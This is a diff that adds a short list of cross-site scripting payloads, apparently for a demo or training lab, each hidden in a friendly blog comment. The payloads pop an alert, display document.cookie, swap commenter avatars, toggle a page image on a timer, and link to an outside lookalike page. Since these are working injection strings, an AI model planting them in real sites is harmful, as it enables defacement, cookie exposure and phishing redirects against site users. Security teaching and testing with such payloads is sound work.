@@ -1,0 +1,14 @@
+# check the xss
+<script>alert("Aruna");</script>
+
+# get client browser cookies
+<script>alert(document.cookie);</script>
+
+# change the profile images
+Nice Article<script> function changeImage(){$(".commenterImage img").attr("src","https://img.icons8.com/color/52/000000/android-os.png");} changeImage();</script>
+
+# load the website in a different domain
+Great work guys, Dammika <a href="http://mitraisecurityceg.azurewebsites.net/Comments.html">read more </a>
+
+# change buld image using a timer
+Like the content<script>function changeBulb() {setInterval(function () {var imgUrl = $("#bulbImage").attr("src");if (imgUrl == "/Content/images/pic_bulboff.gif") {$("#bulbImage").attr("src", "/Content/images/pic_bulbon.gif");} else {$("#bulbImage").attr("src", "/Content/images/pic_bulboff.gif");}}, 3000);} changeBulb(); </script>
